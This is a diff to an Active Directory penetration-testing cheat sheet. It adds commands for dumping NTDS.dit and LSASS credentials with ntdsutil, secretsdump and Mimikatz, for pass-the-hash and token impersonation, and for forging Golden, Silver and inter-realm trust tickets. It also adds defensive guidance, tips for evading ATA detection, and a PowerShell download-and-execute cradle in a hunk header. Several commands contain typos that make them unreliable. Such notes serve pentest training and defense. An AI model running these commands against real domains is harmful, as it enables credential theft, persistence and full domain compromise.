@@ -328,62 +328,60 @@ powershell.exe -exec Bypass -C "IEX (New-Object Net.WebClient).DownloadString('h
 
 ### Dumping AD Credentials
 
-#### secretsdump
-Need domain admin credentials:
-```
-secretsdump.py -just-dc-ntlm <DOMAIN>/<USER>@<DOMAIN_CONTROLLER>
-```
+- secretsdump -  Need domain admin credentials: `secretsdump.py -just-dc-ntlm <DOMAIN>/<USER>@<DOMAIN_CONTROLLER>`
+- NTDS.dit
+  - AD data stored in: ` %SYSTEMROOT%\NTDS\ntds.dit`
+    - Cannot be copied directly to another location
+    - Can be extracted using
+      - Domain Controller Replication Services
+      - Native Windows Binaries
+      - WMI
+      - Backups / External Storage for DC
+      - VMWare / HyperV for virtual DCs
+        - VMWare admin can call virtual DC within VMWare
+        - Clone a DC and copy the storage file
+        - No events triggered
+      - NTDSUtil
+        - DC Promo has to copy from another DC
+        - But if NTDSUtil was used to create an IMF (Install From Media), it makes a copy of NTDS.dit
+          - Can use NTDSUtil to create an IMF or look for IMF in network
+  - Extraction techniques and tools: [https://pentestlab.blog/2018/07/04/dumping-domain-password-hashes/ - Dumping Domain Password Hashes](https://pentestlab.blog/2018/07/04/dumping-domain-password-hashes/)
+  - Steps:
+    - cmd.exe as Administrator
+    - ntdsutil
+        ```bat
+        snapshot
+        activate instance NTDS
+        create
 
-#### NTDS.dit
-
-- AD data stored in: ` %SYSTEMROOT%\NTDS\ntds.dit`
-  - Cannot be copied directly to another location
-  - Can be extracted using
-    - Domain Controller Replication Services
-    - Native Windows Binaries
-    - WMI
-    - Backups / External Storage for DC
-    - VMWare / HyperV for virtual DCs
-      - VMWare admin can call virtual DC within VMWare
-      - Clone a DC and copy the storage file
-      - No events triggered
-    - NTDSUtil
-      - DC Promo has to copy from another DC
-      - But if NTDSUtil was used to create an IMF (Install From Media), it makes a copy of NTDS.dit
-        - Can use NTDSUtil to create an IMF or look for IMF in network
-- Extraction techniques and tools: [https://pentestlab.blog/2018/07/04/dumping-domain-password-hashes/ - Dumping Domain Password Hashes](https://pentestlab.blog/2018/07/04/dumping-domain-password-hashes/)
-
-Steps:
-
-- cmd.exe as Administrator
-- ntdsutil
-```
-snapshot
-activate instance NTDS
-create
-
-mount <UUID>
-```
-- copy NTDS.dit (located in Windows\NTDS\NTDS.dit by default)
-- ntdsutil
-```
-unmount <UUID>
-delete <UUID>
-quit
-quit
-```
-```
-reg.exe save HKLM\SYSTEM <path_where_you_want_to_save_it>
-```
-```
-secretsdump.py -system <path_to_system_hive> -ntds <path_to_ntds.dit> LOCAL
-```
-
-#### Dumping Credentials on DC
-
-- Take memory dump of LSASS process using task manager and use Mimikatz offline
-- Run Mimikatz on DC
-- Invoke-Mimikatz on DC via PS remoting
+        mount <UUID>
+        ```
+    - copy NTDS.dit (located in Windows\NTDS\NTDS.dit by default)
+    - ntdsutil
+        ```bat
+        unmount <UUID>
+        delete <UUID>
+        quit
+        quit
+        ```
+        ```bat
+        reg.exe save HKLM\SYSTEM <path_where_you_want_to_save_it>
+        ```
+        ```bat
+        secretsdump.py -system <path_to_system_hive> -ntds <path_to_ntds.dit> LOCAL
+        ```
+- Dumping Credentials on DC - Mimikatz
+  - Take memory dump of LSASS process using task manager and use Mimikatz offline
+  - Run Mimikatz on DC
+  - Invoke-Mimikatz on DC via PS remoting
+- Dumping Credentials on Multiple Machines - Mimikatz
+  - `Invoke-Mimikatz -DumpCreds -ComputerName @("instance1", "instance2")`
+    - Uses PowerShell remoting 
+    - Hence need creds / administrative access to remote computers
+    - If remoting not enabled:
+      - If WIM enabled
+        - WIN32 Proess - Class Create Method (TODO:)
+        - WIN32 Service - Execute Method (TODO:)
 
 ### Pass the Hash
 
@@ -406,7 +404,6 @@ secretsdump.py -system <path_to_system_hive> -ntds <path_to_ntds.dit> LOCAL
 ### Over Pass the Hash / Pass the Key
 
 ![image-20190603075915450](_assets/image-20190603075915450.png)> Ref: [https://www.blackhat.com/docs/us-14/materials/us-14-Duckwall-Abusing-Microsoft-Kerberos-Sorry-You-Guys-Don't-Get-It.pdf](https://www.blackhat.com/docs/us-14/materials/us-14-Duckwall-Abusing-Microsoft-Kerberos-Sorry-You-Guys-Don't-Get-It.pdf)
-
 
 
 - If NTLM hash is available, encrypt timestamp with hash and sent it to **KDC** in **AS-REQ** to get a **TGT**
@@ -433,6 +430,8 @@ secretsdump.py -system <path_to_system_hive> -ntds <path_to_ntds.dit> LOCAL
   - `privilege::debug    sekurlsa::pth /user:Administrator /domain:<DomainName> /ntlm:<Hash>`
 - References
   - [http://www.janua.fr/active-directory-vulnerability-disclosure-weak-encryption-enables-attacker-to-change-victims-password-without-being-logged/](http://www.janua.fr/active-directory-vulnerability-disclosure-weak-encryption-enables-attacker-to-change-victims-password-without-being-logged/)
+- Mimikatz
+  - `Invoke-Mimikatz -Command '"sekurlsa::pth /user:Administrator /domain:. /ntlm:<ntlmhash> /run:powershell.exe"'` 
 
 ### Pass the Ticket
 
@@ -471,6 +470,14 @@ sekurlsa::tickets export
 kerberos:ptt <ticket.kirbi>
 ```
 
+### Token Manipulation
+
+- `Invoke-TokenManipulation` / `Incognito` for impersonation 
+- Admin privileges are required to adjust token prilileges 
+- Can also use `Mimikatz`
+- New process with token of given user: `Invoke-TokenManipulation -ImpresonateUser -Username "domain/user"`
+- New process with token of another process: `Invoke-TokenManupulation -CreateProcess "C:\Windows\system32\WindowsPowerShell\v1.0\PowerShell.exe" -ProcessId 500"`
+
 ### DCSyc
 
 - Used to sync AD to Azure
@@ -507,11 +514,113 @@ kerberos:ptt <ticket.kirbi>
     et' -w 3 'C:\Users\weaknet\Desktop\Portfolio\VMWare Shared\rockyou.txt'
     hashcat (v5.1.0) starting...
     ```
+## Privilege Escalation Across Domains 
+
+- Child to forest root
+  - Domain in same forest gave implicit two  way trust with forest root
+  - There is a trust key  bwterrn parent and child domains
+  - `Inter-realm TGT`
+    ![domain-trust](_assets/domain-trust.jpg)
+- Approaches 
+  - Trust tickets
+    - `Inter-realm TGT` (sent along with request for TGS) to other DC is validated by 
+      - Decrypting `Inter-realm TGT` with `Trust Key`
+    - If you have trust-key, you can  forge trust-tickets
+      - On child domain, to get trust-key: `Invoke-Mimikatz -Command '"lsadump::trust /patch"'`
+      - FOrge inter-realm TGT: `Invoke-Mimikatz -Command '"Kerberos::golden /domain:example.powershell.local /sid<sid> /sids:<sid-history-of-enterprise-admin> /rc4:<rc4> /user:Administrator /service:kerbtgt /target:powershell.local /ticket:trust_tkt.kirbi"'`
+    - Get TGS for a service using forged trust ticket: 
+      - `asktgs.exe trust_tht.kirbi CIFS/dc.parent.powershell.local` 
+    - Access
+      - `kirbikator.exe lsa example.kirbi`
+      - `ls \\dc.parent.powershell.local\c$`
+  - Krbtgt hash
+    - Similar to Golden Ticket
+    - Once you have kerbtgt hash of current domain, use SID history to forge a TGT:
+      - `Invoke-Mimikatz -Command '"lsadump::lsa /patch"'`
+      - `Invoke-Mimikatz -Command '"Kerberos::golden /user:Adminsitator /domain:example.powershell.local /sid<sid> /krbtgt:<hash> /sids:<sid-history-of-enterprise-admin> /ticket:krb_tkt.kirbi"'`
+    - On a machine in the other domain: 
+      - `Invoke-Mimikatz -Command '"kerberos:ppt krb_tkt.kirbi"'`
+
+## Persistence
+
+- Golden Ticket 
+  - A valud TGT signed and encrypted by the hash of krbtgt account
+  - User account validation is not done by DC (KDC service), until TGT is older than 20 minutes
+    - Can even delete / revoke accounts 
+  - Krbtgt user hash could be used to impersonate any user with any privileges from even from a non-domain machine 
+  - Single passwoed change has no effect on this attack (need two change operations) 
+  - Why persistance technique?
+    - Once you have domain-admin, use it to extract all credentials 
+    - Forge a TGT to get persistance
+  - Execute mimikatz on DC: `Invoke-Mimikatz -Command '"lsadumo::lsa /patch"' -Computername ops-dc` 
+    - Patch the running `lsa` process (execute code on DC)
+  - Use DCSync to get krbtgt hash (when you have DA privilages for the domain): `Invoke-Mimikatz -Command '"lsadump::dcsync /user:example\krbtgt"'`
+    - Without running code on DC
+  - On any machine: `Invoke-Mimikatz -Command '"kerberos:golden /User:Administrator /domain:example.powershell.local /sid:<domain_sid> kerbtgt:<hash> /id:500 /group:513 /ppt"'`
+- Silver Ticket
+  - A valid TGS is encrypted and signed by the NTLM hash of serive account 
+  - Less noisy. No communication with DC is required. 
+  - Service rarely check PAC (Privileged Attribute Certificate)
+  - Services will allow access only yo the services themselves
+  - Allows access to a paticular service on a paticular machine
+  - `Invoke-Mimikatz -Command '"kerberos:golden /domain:example.powershell.local /sid:<domain_sid> kerbtgt:<hash> /target:dc.example.powershell.local /service:cifs /rc4:<rc4_of_service_account_for_cifs/machine_account> /id:500 /user:Administrator /ppt"'`
 
 ## Defense 
 
+- Do not allow or limit login of DAs to any other machines (other than DC)
+  - If it's necessary, there shouldn't be any other administrators on that machine
+- Do not run services with DA account
+- Monitor event ID 
+  - 4624: Account logon
+  - 4634: Account logoff
+  - 4672: Admin logon
+  - 4769 - A kerberos ticket was requested 
+- Kerberos Mitigations
+  - Service account passwords should be hard to guess 
+  - Use managed service accounts (auto change password and deligated SPN management) 
+- Detect kerberost:
+  - 4769 and 
+  - Encryption type is RC4
+  - Service account for kerberos ticket request is a service account
+- Securing Trust Tickets 
+  - SID filtering
+    - Avoid SID history abuse (DA from child to EA on forest root)
+    - Enabled by default on all inter-forest-trusts.
+    - Intra-forest trusts are assumed to be secured by default (forest is the security boundary)
+    - SID filtering can break applications and user access (hence, usually disabled)
+  - Selective Authentication
+    - Users between the trusts will not be automatically authenticated. 
+    - Individual access to domains and servers in the trusting domain/forest should be given
+- ATA for Detecting 
+  - Recon: Account enum. Netsession enum
+  - Compromised Credentials Attacks: Bruteforce, High privilege account/service account exposed in clear text, Honey token, usual protocol (NTLM and Kerberos)
+  - Credential/Hash/Ticket Replay attacks 
+- Bypassing ATA
+  - Avoid talking to the DC as long as possible 
+  - Make appear the traffic we generate as attacker normal
+    - Example:  
+      - Use AES keys when downgrades are detected
+
 - Use unique and strong local admin account passwords
-- Use Microsoft LAPS to automate local admin password changes
+- Use Microsoft LAPS (Local Administrator Password Solution) to automate local admin password changes
+  - Centralized storage of passwords in AD with periodic randomizing where read permissions can be access controlled 
+  - Storage in clear text, transmission is encrypted
+  - <https://blog.netspi.com/running-laps-around-cleartext-passwords/>
+- Use Privileged Adminsitratove Workstations (PAWs)
+  - Hardened workstation for performing sensitive tasks like domain administration and cloud infrastructure access
+  - Stratergies:
+    - Separate privilege and hardware for admin tasks 
+    - Admin Jump servers to be accessed only from PAW
+    - Having a VM on a PAW for user tasks
+- Administrative Tier Model
+  - Tier 0 - privileged access across the enterprise 
+  - Tier 1 - access to resources with business value
+  - Tier 2 - access to resources with business value, that are hosted on user workstations and devices (Ex: Help Desk)
+
+    ![](_assets/2020-08-09-00-21-08.png)
+    ![](_assets/2020-08-09-00-21-25.png)
+    > <https://docs.microsoft.com/en-us/windows-server/identity/securing-privileged-access/securing-privileged-access-reference-material>
+
 - KB2871997 to disallow local account logon across the network 
   - <https://technet.microsoft.com/library/security/2871997>
   - Microsoft has definitely raised the bar: accounts that are members of the localgroup “Administrators” are no longer able to execute code with WMI or PSEXEC, use schtasks or at, or even browse the open shares on the target machine. Oh, except (as pwnag3 reports and our experiences confirm) the RID 500 built-in Administrator account, even if it’s renamed.
@@ -529,6 +638,8 @@ kerberos:ptt <ticket.kirbi>
   - Welcome to building your first domain controller!: <https://github.com/rootsecdev/Microsoft-Blue-Forest/blob/master/FirstDomainControllerInstall.md>
 - Pwn and Defend - Active Directory Domain Enumeration: <https://www.youtube.com/watch?v=YxeXfHkHAUI&feature=youtu.be>
 - Implementing Least Privilege Model: <https://docs.microsoft.com/en-us/windows-server/identity/ad-ds/plan/security-best-practices/implementing-least-privilege-administrative-models>
+- Securing Privileged Access - Microsoft 
+- PS Paper - Best Practices of Securing Active Directory
 
 - `NetCease.ps1` to prevent session enumeration on AD computers 
 
